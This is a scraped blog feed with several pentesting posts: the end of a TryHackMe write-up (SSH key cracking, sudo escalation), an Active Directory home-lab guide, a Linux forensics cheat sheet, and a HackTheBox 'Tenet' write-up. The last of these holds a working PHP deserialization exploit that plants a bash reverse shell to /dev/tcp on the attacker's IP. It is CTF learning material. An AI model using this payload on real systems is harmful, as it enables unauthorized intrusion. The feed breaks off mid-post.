(https://github.com/vanhauser-thc/thc-hydra) finished at 2021-05-29 14:20:56 Now I can login as Jan with SSH client.\n→ root@kali «basic-pentesting» «10.9.30.115» $ ssh jan@10.10.245.112 jan@10.10.245.112\u0026#39;s password: Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.4.0-119-generic x86_64) ...\u0026lt;SNIP\u0026gt;... Last login: Mon Apr 23 15:55:45 2018 from 192.168.56.102 jan@basic2:~$ id uid=1001(jan) gid=1001(jan) groups=1001(jan) Since jan has SSH login, I\u0026rsquo;ll definitely use this for enumeration.\nPrivilege Escalation Internal Enumeration In Kay\u0026rsquo;s home directory there is a readable SSH key\njan@basic2:/home/kay/.ssh$ ls -la total 20 drwxr-xr-x 2 kay kay 4096 Apr 23 2018 . drwxr-xr-x 5 kay kay 4096 Apr 23 2018 .. -rw-rw-r-- 1 kay kay 771 Apr 23 2018 authorized_keys -rw-r--r-- 1 kay kay 3326 Apr 19 2018 id_rsa -rw-r--r-- 1 kay kay 771 Apr 19 2018 id_rsa.pub I tried the key for login locally as user Kay but it wanted passphrase, so I\u0026rsquo;ll just grab the private key for cracking.\njan@basic2:/home/kay/.ssh$ cat id_rsa -----BEGIN RSA PRIVATE KEY----- Proc-Type: 4,ENCRYPTED DEK-Info: AES-128-CBC,6ABA7DE35CDB65070B92C1F760E2FE75 IoNb/J0q2Pd56EZ23oAaJxLvhuSZ1crRr4ONGUAnKcRxg3+9vn6xcujpzUDuUtlZ o9dyIEJB4wUZTueBPsmb487RdFVkTOVQrVHty1K2aLy2Lka2Cnfjz8Llv+FMadsN XRvjw/HRiGcXPY8B7nsA1eiPYrPZHIH3QOFIYlSPMYv79RC65i6frkDSvxXzbdfX ...\u0026lt;SNIP\u0026gt;... 4eaCAHk1hUL3eseN3ZpQWRnDGAAPxH+LgPyE8Sz1it8aPuP8gZABUFjBbEFMwNYB e5ofsDLuIOhCVzsw/DIUrF+4liQ3R36Bu2R5+kmPFIkkeW1tYWIY7CpfoJSd74VC 3Jt1/ZW3XCb76R75sG5h6Q4N8gu5c/M0cdq16H9MHwpdin9OZTqO2zNxFvpuXthY -----END RSA PRIVATE KEY----- Cracking id_rsa I\u0026rsquo;ll convert Kay\u0026rsquo;s id_rsa to hash using ssh2john.py.\n→ root@kali «basic-pentesting» «10.9.30.115» $ /usr/share/john/ssh2john.py kay_rsa \u0026gt; kay_rsa.hash; cat kay_rsa.hash kay_rsa:$sshng$1$16$6ABA7DE35CDB65070B92C1F760E2FE75$2352$22835bfc9d2ad8f779e84676de801a2712e...\u0026lt;SNIP\u0026gt;... JtR finds the password to be beeswax.\nSSH - Kay Interestingly, Kay\u0026rsquo;s is in the sudo group.\n→ root@kali «basic-pentesting» «10.9.30.115» $ chmod 600 kay_rsa \u0026amp;\u0026amp; ssh -i kay_rsa kay@10.10.245.112 Enter passphrase for key \u0026#39;kay_rsa\u0026#39;: Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.4.0-119-generic x86_64) ...\u0026lt;SNIP\u0026gt;... Last login: Mon Apr 23 16:04:07 2018 from 192.168.56.102 kay@basic2:~$ id uid=1000(kay) gid=1000(kay) groups=1000(kay),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare) From here, I only need Kay\u0026rsquo;s password.\nSU - root In Kay\u0026rsquo;s home directory, there is a file called pass.bak. It contains the following string:\nkay@basic2:~$ cat pass.bak heresareallystrongpasswordthatfollowsthepasswordpolicy$$ I tried the string as Kay\u0026rsquo;s password on sudo su - and it worked.\nkay@basic2:~$ sudo su - root@basic2:~# id uid=0(root) gid=0(root) groups=0(root) root@basic2:~# ls -l total 4 -rw-r--r-- 1 root root 1017 Apr 23 2018 flag.txt The flag:\nCongratulations! You\u0026#39;ve completed this challenge. There are two ways (that I\u0026#39;m aware of) to gain a shell, and two ways to privesc. I encourage you to find them all! If you\u0026#39;re in the target audience (newcomers to pentesting), I hope you learned something. A few takeaways from this challenge should be that every little bit of information you can find can be valuable, but sometimes you\u0026#39;ll need to find several different pieces of information and combine them to make them useful. Enumeration is key! Also, sometimes it\u0026#39;s not as easy as just finding an obviously outdated, vulnerable service right away with a port scan (unlike the first entry in this series). Usually you\u0026#39;ll have to dig deeper to find things that aren\u0026#39;t as obvious, and therefore might\u0026#39;ve been overlooked by administrators. Thanks for taking the time to solve this VM. If you choose to create a writeup, I hope you\u0026#39;ll send me a link! I can be reached at josiah@vt.edu. If you\u0026#39;ve got questions or feedback, please reach out to me. Happy hacking!  References  https://samsclass.info/124/proj14/p10xstruts.htm https://www.rapid7.com/db/modules/exploit/multi/http/struts2_rest_xstream/  ","permalink":"https://fahmifj.github.io/writeups/tryhackme/thm-basic-pentesting/","summary":"Room Information   Name: Basic Pentesting Category: Boot2root Type: Challenge/CTF Difficulty: Easy Tools:  Nmap Gobuster John the Ripper smbclient   Skills Learned  Basics of enumeration Brute-force attack     Reconnaissance Nmap nmap full scan discovers six open ports: SSH (22), HTTP (80), SMB (139 \u0026amp; 445), Apache JServ Protocol (8009), and Apache Tomcat (8080).\nEnumeration TCP 445 - SMB Anonymous login is allowed on SMB.","tags":["TryHackMe","Linux","Samba","CVE-2017-9805","Hydra","Password-Cracking","JohnTheRipper","Metasploit","Gobuster","sudo"],"title":"TryHackMe - Basic Pentesting"},{"content":"This is my personal documentation on setting up a pentesting lab in a virtual environment to learn some AD attack scenarios, network pivoting, and C2 (command \u0026amp; control) with metasploit.\nPrerequisites Knowledge  Virtualization and VirtualBox Windows OS and Server Installation Basics knowledge of Windows/Windows Server (Desktop/GUI version)/ Basics knowledge of Active Directory:  AD Domain Principle name DNS   Basics knowledge of Networking (routing).  Hardware The following are the main specifications that I recommend, the list is sorted by priority.\n Storage: 256 GB minimum, SSD is a must for server, or use high speed USB 3.1/ type C drive. RAM: 8 GB of minimum, 16 GB recommended dual channel. CPU: AMD Ryzen 3 or Intel i3 6th (minimum), AMD Ryzen 5+ with H prefix or i5+ 6th gen with K/H prefix. (recommended).  4th gen of i7 is still worth though.    For me, I used a single MSI laptop with the minimum requirements except for the CPU.\nSoftware  VirtualBox (Download) Kali Linux image file (Download) Windows 10 evaluation image file (Download) Windows Server 2019 evaluation image file (Download)  Topology I know it\u0026rsquo;s bad.\nSo, for pivoting, I removed the Windows 10 inside network range of 10.10.10.100/28 from AD Domain.\n It\u0026rsquo;s NIC (Network Interface Card) not NC\n Setup VM System Configuration System Initial for installation\n Server: 2424 MB of RAM Client: x2 1280 MB of RAM  After installation (removed style/desktop/disable junk service)\n Server: 1280 MB of RAM Client: 1024 MB of RAM Attacking machine: 1024MB of RAM  Trust me, I use 8 GB to host these VM. 😂\n Windows 2019 = Server Windows 10 = Client Kali Linux/Armed Ubuntu = Attacker  For initial setup, the two clients can stay inside 192.168.1.0/24 network.\nNetwork Server Adapter 1:\nSetting up Server Initial setup  Admin credentials: administrator:p@$$w0rd! PC Name: server19-DC (restart after) Network (Static):  Adapter 1: 192.168.1.100/24 Adapter 2: 10.10.10.100/28    Promote to Domain Controller  Server Manager \u0026gt; Manage \u0026gt; Add Roles and Features. Add Roles and Features Wizard:  Installation type: \u0026ldquo;Role-based or feature-based installation\u0026rdquo; Server selection: server19-DC Server roles: \u0026ldquo;Active Directory Domain Services\u0026rdquo; and check the \u0026ldquo;Include management tools\u0026rdquo;. Features: Check the \u0026ldquo;Group Policy Management\u0026rdquo; Confirmation: Check on \u0026ldquo;Restart destination server automatically if required\u0026rdquo; Close after it\u0026rsquo;s done.   Server Manager \u0026gt; Notification flag \u0026gt; Click on \u0026ldquo;Promote this server to a domain controller\u0026rdquo; Active Directory Domain Services Configuration Wizard:  Deployment configuration: \u0026ldquo;Add a new forest\u0026rdquo; and set \u0026ldquo;server19.local\u0026rdquo; as root domain name Domain controller options: set \u0026ldquo;Windows Server 2016\u0026rdquo; as FFL (Forest Functional Level) and DFL (Domain Functional Level). Checklist DNS server and set the same admin password for DSRM password. Additional options: set NetBIOS domain name to SERVER19 Let the rest options in default state until installation section. Restart after installation complete.    Domain Accounts  John Smith  User logon name: jsmith@server19.local Password: jsmith@123   Carl Smith  User logon name: cmisth@server19.local Password: @csmith@    All password is set to never expires.\nService Account Fake SQL Service\n User logon name: SQLService@server19.local Password: Mysql@Password123  Set service principle name:\nsetspn -a SERVER19-DC/SQLService.SERVER19.local:60111 SERVER19\\SQLService setspn -T SERVER19.local -Q */* Configure File Sharing (SMB):  Server manager \u0026gt; File and Storage Services \u0026gt; Shares \u0026gt; Task \u0026gt; New Share. New Share Wizard:  Profile: SMB Share Quick Share Location: C:\\Shares\\DATA (Create the Shares folder in C:) Other Settings: Allow caching of share Permission: Leave it default Confirmation and create.    Setting up Client Initial setup  Client 1:  IP: 192.168.1.101 (static) PC name: NESCOFFEE   Client 2:  IP: 192.168.1.102 (static) PC name: MILO    Local Accounts Same with domain accounts, but add an L at the end of username/password.\n Username: cmisthL, password: jsmithL@123 Username: jsmithL, password: @csmith@  Join Domain Client 1:\n Use Server\u0026rsquo;s IP as DNS server: 192.168.1.100 Hit Win+I, type \u0026ldquo;access\u0026rdquo;, click on Connect. Microsoft account window:  Click on \u0026ldquo;Join this device to a local Active Directory domain\u0026rdquo; under the alternate actions. Use the server administrator password to join. Skip the Add an account section Restart    Client 2 has the same steps\nLocal Admin:  Set John Smith (jsmith@server19.local) as local administrator for NESCOFFEE. Set Carl Smith (cmisth@server19.local) as local administrator for MILO.  Setting up Attacking Machine  Put it on the same network Set static IP: 192.168.1.10  AD Attack Scenarios Here are some attack scenarios:\n LLMNR Poisoning - https://www.aptive.co.uk/blog/llmnr-nbt-ns-spoofing/ AS-REP Roasting  Example attacks: ASREP-Roasting tags   Kerberoasting - https://pentestlab.blog/2018/06/12/kerberoast/ Take Over IPv6 DNS - https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/ DCSync  Example attacks: DCSync tags    Attack scenario(s) that requires two clients online + server:\n SMB Relay - https://akimboviper.gitbook.io/pentest-everything/everything/everything-windows/attacking-windows/relay-attacks/smb-relay  Example attacks: HackTheBox - APT    ","permalink":"https://fahmifj.github.io/blog/building-virtual-home-lab-for-pentesting/","summary":"This is my personal documentation on setting up a pentesting lab in a virtual environment to learn some AD attack scenarios, network pivoting, and C2 (command \u0026amp; control) with metasploit.\nPrerequisites Knowledge  Virtualization and VirtualBox Windows OS and Server Installation Basics knowledge of Windows/Windows Server (Desktop/GUI version)/ Basics knowledge of Active Directory:  AD Domain Principle name DNS   Basics knowledge of Networking (routing).  Hardware The following are the main specifications that I recommend, the list is sorted by priority.","tags":["nanoblog","Home-lab","Active-Directory"],"title":"Building Virtual Home Lab for Pentesting"},{"content":"My short cheat sheet for forensics and incident response on Linux systems. This will be updated over time.\nUsers-related Last login\n$ lastlog $ last Users with login shells\n$ cat /etc/passwd | grep sh$ List users' cron\n$ for user in $(cat /etc/passwd | cut -f1 -d: ); do echo $user; crontab -u $user -l; done # users with shells only $ for user in $(cat /etc/passwd | grep sh$ | cut -f1 -d: ); do echo $user; crontab -u $user -l; done SSH authorized keys\n$ find / -type f -name authorized_keys Processes, Networks and Services Show process tree with username TTY, and wide output.\n$ ps auxfww Process details\n$ lsof -p [pid] Show all connections don\u0026rsquo;t resolve names (IP only)\n$ lsof -i -n $ netstat -anp # Look for tcp only $ netstat -antp $ ss -antp List all services\n$ service --status-all List firewall rules\n$ iptables --list-rules List all timers\n$ systemctl list-timers --all DNS related\n/etc/hosts /etc/resolv.conf Files and Folders Show list files and folder with nano timestamp, sort by modification time (newest).\n$ ls --full-time -lt List all files that were modified on a specific date/time.\n# List files which were modified on 2021-06-16 (YYYY-MM-DD) $ find / -newermt \u0026#34;2021-06-16\u0026#34; -ls 2\u0026gt;/dev/null # List files which were modified on 2021-05-01 until 2021-05-09 (9 days ago) $ find / -newermt \u0026#34;2021-05-01\u0026#34; ! -newermt \u0026#34;2021-05-10\u0026#34; -ls 2\u0026gt;/dev/null # List files which were modified on 2021-05-01 until 2021-05-09 (9 days ago) + add filter $ find / -newermt \u0026#34;2021-05-01\u0026#34; ! -newermt \u0026#34;2021-05-10\u0026#34; -ls 2\u0026gt;/dev/null | grep -v \u0026#39;filterone\\|filtertwo\u0026#39; # List files modified between 01:00 and 07:00 on June 16 2021. $ find / -newermt \u0026#34;2021-06-16 01:00:00\u0026#34; ! -newermt \u0026#34;2021-06-16 07:00:00\u0026#34; -ls 2\u0026gt;/dev/null # List files that were accessed exactly 2 days ago. $ find / -atime 2 -ls 2\u0026gt;/dev/null # List files that were modified in the last 2 days. $ find / -mtime -2 -ls 2\u0026gt;/dev/null File inspection\n$ stat [file] $ exiftool [file] Observe changes in files\n$ find . -type f -exec md5sum {} \\; | awk \u0026#39;{print $1}\u0026#39; | sort | uniq -c | grep \u0026#39; 1 \u0026#39; | awk \u0026#39;{print $2\t}\u0026#39; Look for cap_setuid+ep in binary capabilities\n$ getcap -r /usr/bin/ $ getcap -r /bin/ $ getcap -r / 2\u0026gt;/dev/null SUID\n$ find / -type f -perm -u=s 2\u0026gt;/dev/null Log auditing\n$ aureport --tty Persistence areas Directories:\n/etc/cron*/ /etc/incron.d/* /etc/init.d/* /etc/rc*.d/* /etc/systemd/system/* /etc/update.d/* /var/spool/cron/* /var/spool/incron/* /var/run/motd.d/* Files:\n/etc/passwd /etc/sudoers /home/\u0026lt;user\u0026gt;/.ssh/authorized_keys /home/\u0026lt;user\u0026gt;/.bashrc References  https://stackoverflow.com/questions/18339307/find-files-in-created-between-a-date-range https://unix.stackexchange.com/questions/119598/as-root-how-can-i-list-the-crontabs-for-all-users https://unix.stackexchange.com/questions/169798/what-does-newermt-mean-in-find-command https://ippsec.rocks/ https://0xdf.gitlab.io/2021/06/05/htb-scriptkiddie.html#incron  ","permalink":"https://fahmifj.github.io/blog/linux-forensics-command-cheat-sheet/","summary":"My short cheat sheet for forensics and incident response on Linux systems. This will be updated over time.\nUsers-related Last login\n$ lastlog $ last Users with login shells\n$ cat /etc/passwd | grep sh$ List users' cron\n$ for user in $(cat /etc/passwd | cut -f1 -d: ); do echo $user; crontab -u $user -l; done # users with shells only $ for user in $(cat /etc/passwd | grep sh$ | cut -f1 -d: ); do echo $user; crontab -u $user -l; done SSH authorized keys","tags":["nanoblog","Linux","Forensics","Cheatsheet"],"title":"Linux Forensics Command Cheat Sheet"},{"content":"Tenet is a medium difficulty Linux machine from Hack The Box. It features a basic PHP deserialization vulnerability, which can be leveraged to gain a foothold. Inside the system, enumeration of the web configuration files reveals a set of database credentials, and these are reused for SSH login. There is a sudo privileges on a custom script, and it can be used to escalate myself into root account if I win a race condition against it.\nSkills Learned  PHP deserialization attack Race-condition  Tools  Nmap Gobuster PHP  Reconnaissance Nmap A full TCP scan on Tenet discovers two open ports: SSH on port 22 and an Apache web server on port 80.\n$ ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.223 | grep \u0026#39;^[0-9]\u0026#39; | cut -d \u0026#39;/\u0026#39; -f 1 | tr \u0026#39;\\n\u0026#39; \u0026#39;,\u0026#39; | sed s/,$//) → root@kali «tenet» «10.10.14.31» $ nmap -sC -sV -p$ports -oA scans/full-tenet 10.10.10.223 # Nmap 7.80 scan initiated Tue Mar 16 23:32:46 2021 as: nmap -sC -sV -p22,80 -oA scans/full-tenet 10.10.10.223 Nmap scan report for 10.10.10.223 Host is up (0.059s latency). Scanned at 2021-03-16 23:32:46 EDT for 17s PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 cc:ca:43:d4:4c:e7:4e:bf:26:f4:27:ea:b8:75:a8:f8 (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDA4SymrtoAxhSnm6gIUPFcp1VhjoVue64X4LIvoYolM5BQPblUj2aezdd9aRI227jVzfkOD4Kg3OW2yT5uxFljn7q/Mh5/muGvUNA+nNO6pCC0tZPoPEwMT+QvR3XyQXxbP6povh4GISBySLw/DFQoG3A2t80Giyq5Q7P+1LH1f/m63DyiNXOPS8fNBPz59BDEgC9jJ5Lu2DTu8ko1xE/85MLYyBKRSFHEkqagRXIYUwVQASHgo3OoJ+VAcBTJZH1TmXDc4c6W0hIPpQW5dyvj3tdjKjlIkw6dH2at9NL3gnTP5xnsoiOu0dyofm2L5fvBpzvOzUnQ2rps2wANTZwZ | 256 85:f3:ac:ba:1a:6a:03:59:e2:7e:86:47:e7:3e:3c:00 (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLMM1BQpjspHo9teJwTFZntx+nxj8D51/Nu0nI3atUpyPg/bXlNYi26boH8zYTrC6fWepgaG2GZigAqxN4yuwgo= | 256 e7:e9:9a:dd:c3:4a:2f:7a:e1:e0:5d:a2:b0:ca:44:a8 (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMQeNqzXOE6aVR3ulHIyB8EGf1ZaUSCNuou5+cgmNXvt 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) | http-methods: |_ Supported Methods: OPTIONS |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Apache2 Ubuntu Default Page: It works Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Read data files from: /usr/bin/../share/nmap Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Tue Mar 16 23:33:03 2021 -- 1 IP address (1 host up) scanned in 16.80 seconds Enumeration TCP 80 - Website nmap already identified that this site is the default page of Apache web server.\nGobuster Running gobuster against the site reveals that there is a WordPress site.\n→ root@kali «tenet» «10.10.14.31» $ gobuster dir -u http://10.10.10.223/ -w /opt/SecLists/Discovery/Web-Content/common.txt -b 404,403 -x txt,php,bak -o gobuster/gobuster-nohostname =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.10.223/ [+] Method: GET [+] Threads: 10 [+] Wordlist: /opt/SecLists/Discovery/Web-Content/common.txt [+] Negative Status codes: 403,404 [+] User Agent: gobuster/3.1.0 [+] Extensions: txt,php,bak [+] Timeout: 10s =============================================================== 2021/06/14 06:08:53 Starting gobuster in directory enumeration mode =============================================================== /index.html (Status: 200) [Size: 10918] /users.txt (Status: 200) [Size: 7] /wordpress (Status: 301) [Size: 316] [--\u0026gt; http://10.10.10.223/wordpress/] =============================================================== 2021/06/14 06:11:20 Finished =============================================================== Poking /users.txt returns a \u0026ldquo;Success\u0026rdquo; message.\n/wordpress On /wordpress, somehow the site looks broken.\nIt turns out there is a hostname.\nI\u0026rsquo;ll add tenet.htb to my /etc/hosts\n→ root@kali «tenet» «10.10.14.31» $ echo \u0026#39;tenet.htb 10.10.10.223\u0026#39; \u0026gt;\u0026gt; /etc/hosts Poking the site with curl shows that this port has a slightly different contents when it visited using a hostname.\n→ root@kali «tenet» «10.10.14.31» $ curl -s http://10.10.10.223 | wc -c 10918 → root@kali «tenet» «10.10.14.31» $ curl -s http://tenet.htb | wc -c 10581 TCP 80 - tenet.htb On tenet.htb, there are some blog posts.\nOne of the post titled with \u0026ldquo;Migrations\u0026rdquo; states that they\u0026rsquo;re currently migrating the data from a flat file.\n /etc/passwd and /etc/shadow are the examples of what is known as a flat file structure.\n At the bottom, there is a comment by a user named neil.\nThe user was asking about a PHP file called sator and its backup file. I\u0026rsquo;ll note this.\nWPScan I ran a wpscan to find some database backup or something related with that, but I didn\u0026rsquo;t find anything except usernames.\n→ root@kali «tenet» «10.10.14.31» $ wpscan --url http://tenet.htb/ -e vp,vt,cb,dbe,u1-15 _______________________________________________________________ __ _______ _____ \\ \\  / / __ \\ / ____| \\ \\  /\\  / /| |__) | (___ ___ __ _ _ __ ® \\ \\/ \\/ / | ___/ \\___ \\ / __|/ _` | \u0026#39;_ \\  \\  /\\  / | | ____) | (__| (_| | | | | \\/ \\/ |_| |_____/ \\___|\\__,_|_| |_| WordPress Security Scanner by the WPScan Team Version 3.8.17 Sponsored by Automattic - https://automattic.com/ @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart _______________________________________________________________ ...\u0026lt;SNIP\u0026gt;... [i] User(s) Identified: [+] protagonist | Found By: Author Posts - Author Pattern (Passive Detection) | Confirmed By: | Rss Generator (Passive Detection) | Wp Json Api (Aggressive Detection) | - http://tenet.htb/index.php/wp-json/wp/v2/users/?per_page=100\u0026amp;page=1 | Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Login Error Messages (Aggressive Detection) [+] neil | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Confirmed By: Login Error Messages (Aggressive Detection) Directory brute-force (Guessing) I tried to guess the location of sator php files with curl but nothing there.\n→ root@kali «tenet» «10.10.14.31» $ for i in sator.php sator.php.bak; do curl -sIL http://tenet.htb/$i; done HTTP/1.1 404 Not Found Date: Mon, 14 Jun 2021 10:51:50 GMT Server: Apache/2.4.29 (Ubuntu) Content-Type: text/html; charset=iso-8859-1 HTTP/1.1 404 Not Found Date: Mon, 14 Jun 2021 10:51:51 GMT Server: Apache/2.4.29 (Ubuntu) Content-Type: text/html; charset=iso-8859-1 VHost enumeration Next, I\u0026rsquo;ll try to enumerate vhost, but first I\u0026rsquo;ll use cewl to generate a custom wordlist. Because \u0026ldquo;sator\u0026rdquo; and \u0026ldquo;backup\u0026rdquo; are consists of 5 characters, I\u0026rsquo;ll set the minimum word length to 5.\n→ root@kali «tenet» «10.10.14.31» $ cewl -m 5 -w wordlist-vhost http://tenet.htb CeWL 5.4.6 (Exclusion) Robin Wood (robin@digi.ninja) (https://digi.ninja/) I tried the wordlist with ffuf, but didn\u0026rsquo;t find any (damn this tool is insanely fast, took 5 sec).\n→ root@kali «tenet» «10.10.14.31» $ ffuf -w wordlist-vhost -u http://10.10.10.223 -H \u0026#34;Host: FUZZ.tenet.htb\u0026#34; -mc 200 -fl 376 /\u0026#39;___\\ /\u0026#39;___\\  /\u0026#39;___\\  /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\  \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\  \\ \\_\\  \\ \\____/ \\ \\_\\  \\/_/ \\/_/ \\/___/ \\/_/ v1.3.0-dev ________________________________________________ :: Method : GET :: URL : http://10.10.10.223 :: Wordlist : FUZZ: wordlist-vhost :: Header : Host: FUZZ.tenet.htb :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200 :: Filter : Response lines: 376 ________________________________________________ :: Progress: [93/93] :: Job [1/1] :: 11 req/sec :: Duration: [0:00:05] :: Errors: 0 :: Apache Default Page (Revisit) The files that user Neil talking about was found at http://10.10.10.223/[here] .\n→ root@kali «tenet» «10.10.14.31» $ for i in sator.php sator.php.bak; do curl -sIL http://10.10.10.223/$i; done HTTP/1.1 200 OK Date: Mon, 14 Jun 2021 11:21:04 GMT Server: Apache/2.4.29 (Ubuntu) Content-Type: text/html; charset=UTF-8 HTTP/1.1 200 OK Date: Mon, 14 Jun 2021 11:21:05 GMT Server: Apache/2.4.29 (Ubuntu) Last-Modified: Thu, 17 Dec 2020 09:52:50 GMT ETag: \u0026#34;202-5b6a5f47911e4\u0026#34; Accept-Ranges: bytes Content-Length: 514 Content-Type: application/x-trash Another guessing, here the keyword is \u0026ldquo;Migration\u0026rdquo;, so I think that before they moving into /wordpress/, the site was previously hosted at / (the root).\nPoking Sator.php results the following contents:\n→ root@kali «tenet» «10.10.14.31» $ curl -s http://10.10.10.223/sator.php [+] Grabbing users from text file \u0026lt;br\u0026gt; [] Database updated \u0026lt;br\u0026gt; Poking sator.php.bak returns PHP codes.\n→ root@kali «tenet» «10.10.14.31» $ curl -s http://10.10.10.223/sator.php.bak \u0026lt;?php class DatabaseExport { public $user_file = \u0026#39;users.txt\u0026#39;; public $data = \u0026#39;\u0026#39;; public function update_db() { echo \u0026#39;[+] Grabbing users from text file \u0026lt;br\u0026gt;\u0026#39;; $this-\u0026gt; data = \u0026#39;Success\u0026#39;; } public function __destruct() { file_put_contents(__DIR__ . \u0026#39;/\u0026#39; . $this -\u0026gt;user_file, $this-\u0026gt;data); echo \u0026#39;[] Database updated \u0026lt;br\u0026gt;\u0026#39;; // echo \u0026#39;Gotta get this working properly...\u0026#39;; } } $input = $_GET[\u0026#39;arepo\u0026#39;] ?? \u0026#39;\u0026#39;; $databaseupdate = unserialize($input); $app = new DatabaseExport; $app -\u0026gt; update_db(); ?\u0026gt; Source Code Analysis Deserialization vulnerability From the previous code, sator.php.bak contains a PHP magic function called __destruct(). I\u0026rsquo;m not skilled enough to explain it on detail, but from what I know is that the function will be called when there is no more references to an object (comment by me):\n$app = new DatabaseExport; $app -\u0026gt; update_db(); // __destruct is called afterwards // [] Database updated will be printed out Here is an example:\nFurthermore, the user-controlled input with parameter arepo is directly passed to unserialize() function. Knowing this, I could send a malicious DatabaseExport object (serialized) by assuming that sator.php uses the same code as sator.php.bak.\nFoothold Shell as www-data Object Injection/Deserialization PoC From the previous code, unserialize is called before the creation of object ($app), so I will use the opposite magic function called __construct().\nI\u0026rsquo;ll do some testing with this script below.\n\u0026lt;?php class DatabaseExport { public function __construct() { $this-\u0026gt;user_file = \u0026#39;test.php\u0026#39;; $this-\u0026gt;data = \u0026#34;\u0026lt;?php phpinfo(); ?\u0026gt;\u0026#34;; } } $o = new DatabaseExport(); echo urlencode(serialize($o)); ?\u0026gt;I use URL encode there because I\u0026rsquo;m going to use curl to interact with the site. I will save the script to a file called tenetization.php.\nI will run that script and copy the output. If I don\u0026rsquo;t have PHP, I could use this site to get output of my PHP script.\n→ root@kali «exploits» «10.10.14.31» $ php tenetization.php O%3A14%3A%22DatabaseExport%22%3A2%3A%7Bs%3A9%3A%22user_file%22%3Bs%3A8%3A%22test.php%22%3Bs%3A4%3A%22data%22%3Bs%3A19%3A%22%3C%3Fphp+phpinfo%28%29%3B+%3F%3E%22%3B%7D I\u0026rsquo;ll send that output to sator.php via curl.\n→ root@kali «exploits» «10.10.14.31» $ curl -sI \u0026#34;http://10.10.10.223/sator.php?arepo=O%3A14%3A%22DatabaseExport%22%3A2%3A%7Bs%3A9%3A%22user_file%22%3Bs%3A8%3A%22test.php%22%3Bs%3A4%3A%22data%22%3Bs%3A19%3A%22%3C%3Fphp+phpinfo%28%29%3B+%3F%3E%22%3B%7D\u0026#34; HTTP/1.1 200 OK Date: Mon, 14 Jun 2021 12:43:43 GMT Server: Apache/2.4.29 (Ubuntu) Content-Type: text/html; charset=UTF-8 When I visit 10.10.10.223/test.php, it returns the PHP info page, which means I have a code execution.\nBased on 0xdf\u0026rsquo;s awesome writeup, this payload would also works:\n\u0026lt;?php class DatabaseExport { public user_file = \u0026#39;test.php\u0026#39;; public data = \u0026#34;\u0026lt;?php phpinfo(); ?\u0026gt;\u0026#34;; } $o = new DatabaseExport(); echo urlencode(serialize($o)); ?\u0026gt;Weaponize - Reverse Shell This time, I\u0026rsquo;ll modify the file name and the data for reverse shell.\n\u0026lt;?php class DatabaseExport { public function __construct() { $this-\u0026gt;user_file = \u0026#39;iamf.php\u0026#39;; $this-\u0026gt;data = \u0026#34;\u0026lt;?php system(\\\u0026#34;/bin/bash -c \u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.31/443 0\u0026gt;\u0026amp;1\u0026#39; \\\u0026#34;) ?\u0026gt;\u0026#34;; } } $o = new DatabaseExport(); echo urlencode(serialize($o)); ?\u0026gt;I\u0026rsquo;ll script the exploitation step and then wait on my listener\n#!/bin/bash  serial=`php tenetization.php` curl -s http://10.10.10.223/sator.php?arepo=$serial sleep 5; curl -s http://10.10.10.223/iamf.php When I run the exploit, it hangs.\n→ root@kali «exploits» «10.10.14.31» $ bash tenetization.sh [+] Grabbing users from text file \u0026lt;br\u0026gt; [] Database updated \u0026lt;br\u0026gt;[] Database updated \u0026lt;br\u0026gt; But after a few seconds, I have a shell on my listener\n→ root@kali «~» «10.10.14.31» $ nc -nvlp 443 listening on [any] 443 ... connect to [10.10.14.31] from (UNKNOWN) [10.10.10.223] 39174 bash: cannot set terminal process group (1545): Inappropriate ioctl for device bash: no job control in this shell www-data@tenet:/var/www/html$ id id uid=33(www-data) gid=33(www-data) groups=33(www-data) www-data@tenet:/var/www/html$ Privilege Escalation Shell as neil WP config Inside the wp-config.php file, there is a database credential.\nwww-data@tenet:/var/www/html/wordpress$ cat wp-config.php cat wp-config.php \u0026lt;?php ...\u0026lt;SNIP\u0026gt;... define( \u0026#39;DB_NAME\u0026#39;, \u0026#39;wordpress\u0026#39; ); /** MySQL database username */ define( \u0026#39;DB_USER\u0026#39;, \u0026#39;neil\u0026#39; ); /** MySQL database password */ define( \u0026#39;DB_PASSWORD\u0026#39;, \u0026#39;Opera2112\u0026#39; ); ...\u0026lt;SNIP\u0026gt;... SSH - Neil The credentials works on SSH (neil:Opera2112)\n→ root@kali «tenet» «10.10.14.31» $ ssh neil@10.10.10.223 neil@10.10.10.223\u0026#39;s password: Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-129-generic x86_64) ...\u0026lt;SNIP\u0026gt;... Last login: Mon Jun 14 12:57:27 2021 from 10.10.16.12 neil@tenet:~$ id uid=1001(neil) gid=1001(neil) groups=1001(neil) User\u0026rsquo;s flag is done here.\nneil@tenet:~$ ls -l total 4 -r-------- 1 neil neil 33 Jun 14 06:46 user.txt  Shell as root Sudo privileges User neil has sudo privileges on a custom script called enableSSH.sh.\nneil@tenet:~$ sudo -l Matching 